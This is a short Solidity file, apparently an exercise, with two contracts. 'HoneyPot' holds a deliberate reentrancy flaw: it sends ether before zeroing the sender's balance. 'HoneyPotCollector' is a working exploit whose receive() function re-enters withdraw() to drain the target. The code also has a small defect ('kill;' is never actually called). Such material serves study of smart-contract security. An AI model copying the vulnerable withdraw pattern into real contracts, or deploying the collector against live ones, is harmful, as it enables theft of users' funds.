pragma solidity ^0.8.1;

contract HoneyPot {
    // Todo: Implementation
    mapping (address => uint) public balances;

    function deposit() public payable {
        balances[msg.sender] += msg.value;
    }

    function withdraw() public {
        require(balances[msg.sender] > 0);

        (bool success, ) = msg.sender.call{ value: balances[msg.sender] }("");
        if (!success){
            revert();
        }
        balances[msg.sender]= 0;
    }
fallback() external {
        revert();
    }
}

contract HoneyPotCollector {
    HoneyPot public honeyPot;

    constructor(HoneyPot _honeyPotContractAddress) public {
        honeyPot = _honeyPotContractAddress;
    }
    function kill() public {
        selfdestruct(payable(msg.sender));
    }
    function collect() payable public {
        honeyPot.deposit{ value: msg.value}();
        honeyPot.withdraw();
        kill;
    }
    receive() external payable {
        if(address(honeyPot).balance >= msg.value){
            honeyPot.withdraw();
        }
    }
}
